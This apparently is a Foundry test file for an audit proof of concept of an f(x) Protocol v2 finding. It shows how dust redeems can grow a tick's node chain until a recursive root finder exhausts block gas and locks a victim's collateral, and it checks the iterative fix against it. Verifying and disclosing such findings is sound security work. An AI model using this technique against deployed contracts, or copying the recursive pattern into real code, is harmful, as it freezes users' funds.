// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    FxPoolVulnerable,
    FxPoolFixed,
    MiniToken
} from "./61788-attacker-can-lock-user-funds-through-redeem-function-openzep.sol";

// f(x) Protocol v2 finding 61788: "Attacker can Lock User Funds through Redeem Function".
//
// The verbatim recursive TickLogic._getRootNodeAndCompress walks a position's
// node up its parent-pointer chain. BasePool.redeem enforces NO minimum rawDebt,
// letting an attacker append 150-1000s of child nodes to one tick's chain with
// dust redeems. When a victim then calls operate() to close/update a position in
// that tick, the recursion cannot complete within the block gas limit and
// reverts (OOG / stack overflow) -> the position is permanently un-closable ->
// collateral frozen. PR #22 replaced the recursion with an iterative version
// (negative control here).
contract LockUserFundsViaRedeemTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant CHAIN_DEPTH = 800;
    uint256 internal constant BLOCK_GAS_LIMIT = 30_000_000;
    uint256 internal constant VICTIM_POSITION = 1;
    uint96 internal constant VICTIM_COLL = 100 ether;
    uint96 internal constant VICTIM_DEBT = 40 ether;

    function test_exploit_deepChainLocksPositionViaRecursiveRootFinder() public {
        Exploit e = new Exploit();
        e.run();

        // HARM: within a normal block, the victim's operate() (close/update)
        // reverted -> position permanently locked.
        assertTrue(e.buggyOperateReverted(), "buggy operate() must revert under block gas limit (funds locked)");

        // NEGATIVE CONTROL: the iterative fix resolves the identical chain to its root.
        assertTrue(e.fixedOperateSucceeded(), "fixed operate() must succeed on identical chain");
        assertEq(e.fixedRoot(), CHAIN_DEPTH, "fix resolves to the true root node");

        // Frozen collateral magnitude recorded on the marker at the SINK.
        assertEq(e.lockedCollateral(), uint256(VICTIM_COLL), "locked collateral magnitude");
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), uint256(VICTIM_COLL), "marker records frozen collateral at SINK");
    }

    // Direct differential proof against the real functions on the IDENTICAL deep
    // chain and IDENTICAL 30M gas budget: the buggy recursive finder runs out of
    // gas, the iterative fix returns the root in < 1.2M gas. This isolates the
    // recursion as the cause (the chain seeding is common to both).
    function test_differential_recursiveOOGButIterativeSucceeds() public {
        FxPoolVulnerable vuln = new FxPoolVulnerable();
        FxPoolFixed fixedPool = new FxPoolFixed();

        vuln.seedChain(CHAIN_DEPTH, VICTIM_POSITION, VICTIM_COLL, VICTIM_DEBT);
        fixedPool.seedChain(CHAIN_DEPTH, VICTIM_POSITION, VICTIM_COLL, VICTIM_DEBT);

        // Recursive root finder exhausts the block budget and reverts.
        bool ok;
        try vuln.operate{gas: BLOCK_GAS_LIMIT}(VICTIM_POSITION) returns (uint256) {
            ok = true;
        } catch {
            ok = false;
        }
        assertFalse(ok, "recursive operate() must revert under 30M gas (funds locked)");

        // Iterative root finder returns the true root within the same budget.
        uint256 root = fixedPool.operate{gas: BLOCK_GAS_LIMIT}(VICTIM_POSITION);
        assertEq(root, CHAIN_DEPTH, "iterative fix resolves the deep chain");
    }

    // A SHALLOW chain (normal, log(n) depth) closes fine on the vulnerable pool
    // within the same block budget — proving the DoS is caused by the attacker-
    // controlled chain length, not by operate() itself being broken.
    function test_control_shallowChainClosesOnVulnerablePool() public {
        FxPoolVulnerable vuln = new FxPoolVulnerable();
        vuln.seedChain(20, VICTIM_POSITION, VICTIM_COLL, VICTIM_DEBT);
        uint256 root = vuln.operate{gas: BLOCK_GAS_LIMIT}(VICTIM_POSITION);
        assertEq(root, 20, "shallow chain resolves normally on the vulnerable pool");
    }
}
